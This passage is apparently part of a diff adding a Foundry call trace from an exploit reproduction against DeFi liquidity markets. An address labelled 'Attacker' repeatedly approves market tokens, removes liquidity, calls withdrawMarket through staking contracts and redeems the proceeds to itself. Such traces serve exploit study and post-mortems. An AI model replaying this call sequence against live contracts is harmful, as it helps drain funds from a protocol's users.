+    │   │   │   ├─ [727] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 833026809409736960211 [8.33e20]
+    │   │   │   ├─ [24363] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 833026809409736960211 [8.33e20])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 833026809409736960211 [8.33e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [169890] 0x888888888889758F76e7103c6CbF23ABbF58F946::removeLiquiditySingleToken(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 833026809409736960211 [8.33e20], TokenOutput({ tokenOut: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, minTokenOut: 0, tokenRedeemSy: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }), LimitOrderData({ limitRouter: 0x0000000000000000000000000000000000000000, epsSkipMarket: 0, normalFills: [], flashFills: [], optData: 0x }))
+    │   │   │   │   ├─ [167353] 0xb7631b93189900745Db51d960Ba64b8E6C658843::removeLiquiditySingleToken(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 833026809409736960211 [8.33e20], TokenOutput({ tokenOut: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, minTokenOut: 0, tokenRedeemSy: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }), LimitOrderData({ limitRouter: 0x0000000000000000000000000000000000000000, epsSkipMarket: 0, normalFills: [], flashFills: [], optData: 0x })) [delegatecall]
+    │   │   │   │   │   ├─ [404] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::readTokens() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000b1b9150f2085f6a553b547099977181ca802752a0000000000000000000000007aa68e84bcd8d1b4c9e10b1e565db993f68a3e090000000000000000000000003568f1d2e8058f6d99daa17051cb4a2930c83978
+    │   │   │   │   │   ├─ [37317] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 833026809409736960211 [8.33e20])
+    │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 0)
+    │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, value: 833026809409736960211 [8.33e20])
+    │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [380] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::isExpired() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [43967] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::burn(0xb1B9150f2085f6a553b547099977181CA802752A, 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 833026809409736960211 [8.33e20])
+    │   │   │   │   │   │   ├─ [876] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::getMarketConfig(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   ├─ [1102] 0xb1B9150f2085f6a553b547099977181CA802752A::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, to: 0x0000000000000000000000000000000000000000, value: 833026809409736960211 [8.33e20])
+    │   │   │   │   │   │   ├─ [26002] 0xb1B9150f2085f6a553b547099977181CA802752A::transfer(0xb1B9150f2085f6a553b547099977181CA802752A, 2155573506087537165123 [2.155e21])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, to: 0xb1B9150f2085f6a553b547099977181CA802752A, value: 2155573506087537165123 [2.155e21])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [1038] 0x83d6fa7F8904299F4a9499fE83b6ae3f21FfbA57::4af74b68(000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000770000000000000000000000000000000000000000000000000000000066d756d30000000000000000000000000000000000000000000000000136e2c45e5a194800000000000000000000000000000000000000000000000000000000000000b500000000000000000000000000000000000000000000000000000000000000b5) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000007700000000000000000000000000000000000000000000000000000000000000b5
+    │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000136e2c45e5a1948
+    │   │   │   │   │   │   ├─ emit Burn(param0: 0xb1B9150f2085f6a553b547099977181CA802752A, param1: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, param2: 833026809409736960211 [8.33e20], param3: 2155573506087537165123 [2.155e21], param4: 632208927028215612992 [6.322e20])
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000074da977b1196f9434300000000000000000000000000000000000000000000002245a94d8bb3a50640
+    │   │   │   │   │   ├─ [404] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::readTokens() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000b1b9150f2085f6a553b547099977181ca802752a0000000000000000000000007aa68e84bcd8d1b4c9e10b1e565db993f68a3e090000000000000000000000003568f1d2e8058f6d99daa17051cb4a2930c83978
+    │   │   │   │   │   ├─ [40247] 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe::swapExactPtForSy(0xb1B9150f2085f6a553b547099977181CA802752A, 632208927028215612992 [6.322e20], 0x)
+    │   │   │   │   │   │   ├─ [876] 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050::getMarketConfig(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   ├─ [1060] 0x3568f1d2e8058F6D99Daa17051Cb4a2930C83978::pyIndexCurrent()
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e2e311687a06457
+    │   │   │   │   │   │   ├─ [4102] 0xb1B9150f2085f6a553b547099977181CA802752A::transfer(0xb1B9150f2085f6a553b547099977181CA802752A, 599293130407423110950 [5.992e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, to: 0xb1B9150f2085f6a553b547099977181CA802752A, value: 599293130407423110950 [5.992e20])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [8902] 0xb1B9150f2085f6a553b547099977181CA802752A::transfer(0x8270400d528c34e1596EF367eeDEc99080A1b592, 148672872105844147 [1.486e17])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, to: 0x8270400d528c34e1596EF367eeDEc99080A1b592, value: 148672872105844147 [1.486e17])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [1038] 0x83d6fa7F8904299F4a9499fE83b6ae3f21FfbA57::4af74b68(000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000770000000000000000000000000000000000000000000000000000000066d756d30000000000000000000000000000000000000000000000000136e2c45e5a194800000000000000000000000000000000000000000000000000000000000000b500000000000000000000000000000000000000000000000000000000000000b5) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000007700000000000000000000000000000000000000000000000000000000000000b5
+    │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000169557c6618281a
+    │   │   │   │   │   │   ├─ [555] 0x7aa68E84bCD8d1B4C9e10B1e565DB993f68a3E09::balanceOf(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3509829191795584673091 [3.509e21]
+    │   │   │   │   │   │   ├─ emit Swap(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: 0xb1B9150f2085f6a553b547099977181CA802752A, param2: -632208927028215612992 [-6.322e20], param3: 599293130407423110950 [5.992e20], param4: 185841090132305185 [1.858e17], param5: 148672872105844147 [1.486e17])
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000207cdce6ea1a4def2600000000000000000000000000000000000000000000000002943d7ca201e521
+    │   │   │   │   │   ├─ [34920] 0xb1B9150f2085f6a553b547099977181CA802752A::redeem(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2754866636494960276073 [2.754e21], 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, 0, true)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xb1B9150f2085f6a553b547099977181CA802752A, to: 0x0000000000000000000000000000000000000000, value: 2754866636494960276073 [2.754e21])
+    │   │   │   │   │   │   ├─ [27574] 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2754866636494960276073 [2.754e21])
+    │   │   │   │   │   │   │   ├─ [26782] 0x9C3D4B06D89a19F560E7da76e3a45B1410Ea8634::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2754866636494960276073 [2.754e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xb1B9150f2085f6a553b547099977181CA802752A, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2754866636494960276073 [2.754e21])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Redeem(param0: 0x888888888889758F76e7103c6CbF23ABbF58F946, param1: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e, param3: 2754866636494960276073 [2.754e21], param4: 2754866636494960276073 [2.754e21])
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000095577461fbb1473269
+    │   │   │   │   │   ├─  emit topic 0: 0x5258a3c624debb1cc84b0f5f66c73eef048832eeebe7178e63e95a53cf28dc94
+    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │        topic 2: 0x0000000000000000000000006010676bc2534652ad1ef5fa8073dcf9ad7ebfbe
+    │   │   │   │   │   │        topic 3: 0x000000000000000000000000e1b4d34e8754600962cd944b535180bd758e6c2e
+    │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000002d2891bd97cc6668d3000000000000000000000000000000000000000000000095577461fbb1473269000000000000000000000000000000000000000000000095577461fbb1473269
+    │   │   │   │   │   └─ ← [Return] 2754866636494960276073 [2.754e21], 185841090132305185 [1.858e17], 2754866636494960276073 [2.754e21]
+    │   │   │   │   └─ ← [Return] 2754866636494960276073 [2.754e21], 185841090132305185 [1.858e17], 2754866636494960276073 [2.754e21]
+    │   │   │   ├─ [63143] 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4::withdrawMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 458662065591341047289 [4.586e20])
+    │   │   │   │   ├─ [62345] 0x79D4E26484C6a16531C8c90F8B22af99FeA83ce3::withdrawMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   ├─ [56134] 0x6E799758CEE75DAe3d84e09D40dc416eCf713652::withdrawMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   ├─ [55330] 0xFF51c6b493c1E4Df4e491865352353EAdff0f9f8::withdrawMarket(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [23268] 0xE688e4e7f07F288949A8B9991197dB174d72f4E3::burn(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   ├─ [15200] 0x16296859C15289731521F199F0a5f762dF6347d0::beforeReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   ├─ [14396] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::beforeReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1458] 0x6Fe9171993A1aFbeAE9b95A42F501DBe25369De0::updateFor(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   ├─ [3458] 0x6Fe9171993A1aFbeAE9b95A42F501DBe25369De0::updateFor(0x0000000000000000000000000000000000000000)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   ├─ [3786] 0x16296859C15289731521F199F0a5f762dF6347d0::afterReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   │   ├─ [2982] 0x8E1aAB7E4127E70E3d3cd1E3D4788E3A31Ff78A9::afterReceiptTokenTransfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000, 458662065591341047289 [4.586e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   ├─ [22461] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::transfer(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6E799758CEE75DAe3d84e09D40dc416eCf713652, to: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   │   ├─ [3292] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(0x6E799758CEE75DAe3d84e09D40dc416eCf713652)
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000a650808e0e24a2ec4de6d
+    │   │   │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit NewMarketWithdraw(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: 458662065591341047289 [4.586e20], param3: 0xE688e4e7f07F288949A8B9991197dB174d72f4E3, param4: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   │   ├─ emit NewWithdraw(param0: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: 458662065591341047289 [4.586e20])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 
+    │   │   │   ├─ [779] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::balanceOf(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 917324131182682094577 [9.173e20]
+    │   │   │   ├─ [24393] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::approve(0x888888888889758F76e7103c6CbF23ABbF58F946, 917324131182682094577 [9.173e20])
+    │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 917324131182682094577 [9.173e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [164369] 0x888888888889758F76e7103c6CbF23ABbF58F946::removeLiquiditySingleToken(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 917324131182682094577 [9.173e20], TokenOutput({ tokenOut: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, minTokenOut: 0, tokenRedeemSy: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }), LimitOrderData({ limitRouter: 0x0000000000000000000000000000000000000000, epsSkipMarket: 0, normalFills: [], flashFills: [], optData: 0x }))
+    │   │   │   │   ├─ [163832] 0xb7631b93189900745Db51d960Ba64b8E6C658843::removeLiquiditySingleToken(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 917324131182682094577 [9.173e20], TokenOutput({ tokenOut: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, minTokenOut: 0, tokenRedeemSy: 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0, pendleSwap: 0x0000000000000000000000000000000000000000, swapData: SwapData({ swapType: 0, extRouter: 0x0000000000000000000000000000000000000000, extCalldata: 0x, needScale: false }) }), LimitOrderData({ limitRouter: 0x0000000000000000000000000000000000000000, epsSkipMarket: 0, normalFills: [], flashFills: [], optData: 0x })) [delegatecall]
+    │   │   │   │   │   ├─ [422] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::readTokens() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000007786729eee8b9d30fe7d91fdff23a0f1d0c615d9000000000000000000000000f0574d8b9dc3a9de768eaa7dbb7bb0c68521b148000000000000000000000000d66b560f4e3e85f22c192d91da847886d5c5fd00
+    │   │   │   │   │   ├─ [37381] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::transferFrom(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 917324131182682094577 [9.173e20])
+    │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x888888888889758F76e7103c6CbF23ABbF58F946, value: 0)
+    │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, value: 917324131182682094577 [9.173e20])
+    │   │   │   │   │   │   ├─ [2859] 0x4f30A9D41B80ecC5B94306AB4364951AE3170210::totalSupplyAndBalanceCurrent(Attacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000001b8ded892c4588cf03baa30000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [386] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::isExpired() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [44097] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::burn(0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 917324131182682094577 [9.173e20])
+    │   │   │   │   │   │   ├─ [876] 0x1A6fCc85557BC4fB7B534ed835a03EF056552D52::getMarketConfig(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   ├─ [1036] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::getRewardTokens() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] []
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, to: 0x0000000000000000000000000000000000000000, value: 917324131182682094577 [9.173e20])
+    │   │   │   │   │   │   ├─ [25958] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::transfer(0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 1235651437503880996388 [1.235e21])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, to: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, value: 1235651437503880996388 [1.235e21])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [1038] 0xC6378a93725E499a20DF8F00aE31D9ce9D09F1CA::4af74b68(000000000000000000000000000000000000000000000000000000000000000f00000000000000000000000000000000000000000000000000000000000000dc0000000000000000000000000000000000000000000000000000000066d756d300000000000000000000000000000000000000000000000001812fcba867af6900000000000000000000000000000000000000000000000000000000000001490000000000000000000000000000000000000000000000000000000000000149) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000dc0000000000000000000000000000000000000000000000000000000000000149
+    │   │   │   │   │   │   ├─  emit topic 0: 0x5c0e21d57bb4cf91d8fe238d6f92e2685a695371b19209afcce6217b478f83e1
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000066d756d3
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000001812fcba867af69
+    │   │   │   │   │   │   ├─ emit Burn(param0: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, param1: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, param2: 917324131182682094577 [9.173e20], param3: 1235651437503880996388 [1.235e21], param4: 587198197462925704671 [5.871e20])
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000042fc1bc3a5db9da62400000000000000000000000000000000000000000000001fd503117baf5dfddf
+    │   │   │   │   │   ├─ [422] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::readTokens() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000007786729eee8b9d30fe7d91fdff23a0f1d0c615d9000000000000000000000000f0574d8b9dc3a9de768eaa7dbb7bb0c68521b148000000000000000000000000d66b560f4e3e85f22c192d91da847886d5c5fd00
+    │   │   │   │   │   ├─ [40115] 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6::swapExactPtForSy(0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 587198197462925704671 [5.871e20], 0x)
+    │   │   │   │   │   │   ├─ [876] 0x1A6fCc85557BC4fB7B534ed835a03EF056552D52::getMarketConfig(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, 0x888888888889758F76e7103c6CbF23ABbF58F946) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008270400d528c34e1596ef367eedec99080a1b59200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000050
+    │   │   │   │   │   │   ├─ [1060] 0xD66b560f4e3e85f22C192d91dA847886d5C5Fd00::pyIndexCurrent()
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1f40c47b30f9af
+    │   │   │   │   │   │   ├─ [4058] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::transfer(0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, 572487576684580830382 [5.724e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, to: 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9, value: 572487576684580830382 [5.724e20])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [8858] 0x7786729eEe8b9d30fE7d91fDFf23A0f1D0C615D9::transfer(0x8270400d528c34e1596EF367eeDEc99080A1b592, 27875002436231042 [2.787e16])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, to: 0x8270400d528c34e1596EF367eeDEc99080A1b592, value: 27875002436231042 [2.787e16])
+    │   │   │   │   │   │   │   └─ ← [Return] true
